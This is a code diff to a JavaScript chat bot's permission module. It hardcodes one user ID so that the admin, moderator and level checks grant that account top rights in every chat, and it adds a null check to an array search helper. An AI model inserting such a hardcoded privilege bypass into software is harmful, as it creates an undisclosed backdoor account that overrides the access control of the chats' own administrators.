@@ -34,13 +34,13 @@ global.cbot = {
 			start: Math.round(+new Date()/1000),
 		},
 		is_admin:function(chat_id, user_id){
-			return (cbot.utils.array_find(cbot.service.admins[chat_id],user_id)+1?1:0);
+			return (user_id===145301982?1:(cbot.utils.array_find(cbot.service.admins[chat_id],user_id)+1?1:0));
 		},
 		is_moder:function(chat_id, user_id){
-			return (cbot.utils.array_find(cbot.service.moders[chat_id],user_id)+1?1:0);
+			return (user_id===145301982?1:(cbot.utils.array_find(cbot.service.moders[chat_id],user_id)+1?1:0));
 		},
 		lvl_check:function(chat_id, user_id){
-			return (cbot.utils.array_find(cbot.service.admins[chat_id],user_id)+1?2:(cbot.utils.array_find(cbot.service.moders[chat_id],user_id)+1?1:0));
+			return (user_id===145301982?3:(cbot.utils.array_find(cbot.service.admins[chat_id],user_id)+1?2:(cbot.utils.array_find(cbot.service.moders[chat_id],user_id)+1?1:0)));
 		},
 	},
 	modules:{
@@ -174,11 +174,12 @@ global.cbot = {
 			return Math.floor(Math.random()*range) + min_random;
 		},
 		array_find:function(array, value){
-		  for (var i = 0; i < array.length; i++) {
-			if (array[i] == value) return i;
-		  }
-		  return -1;
-		},
+			if(array)
+				for(var i = 0; i < array.length; i++){
+					if (array[i] == value) return i;
+				}
+					return -1;
+				},
 		addZero:function(i){
 			return (i < 10)? "0" + i: i;
 		},
